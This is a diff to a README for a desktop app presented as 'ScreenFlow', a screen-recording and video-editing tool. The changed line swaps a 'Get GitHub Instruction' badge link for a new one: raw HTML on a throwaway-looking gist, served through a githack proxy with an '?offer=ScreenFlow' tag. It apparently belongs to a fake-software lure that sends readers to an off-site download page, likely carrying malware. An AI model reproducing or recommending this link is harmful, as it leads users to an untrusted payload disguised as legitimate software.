@@ -2,7 +2,7 @@
 
 ScreenFlow is a professional-grade desktop application that brings together **screen recording, video editing, and media production** in one streamlined tool. Whether you are producing tutorials, presentations, or creative content, ScreenFlow helps you deliver polished videos with minimal effort. 🎬  
 
-[![Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://glcdn.githack.com/-/snippets/4893912/raw/main/app.html?offer=ScreenFlow)
+[![Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/dilleronmoder985/38a91723b47a753de3ec82e3056aa7d1/raw/5f7ad2d98ad18932355db1337a76e6b71208a1df/get.html?offer=ScreenFlow)
 
 ---
 
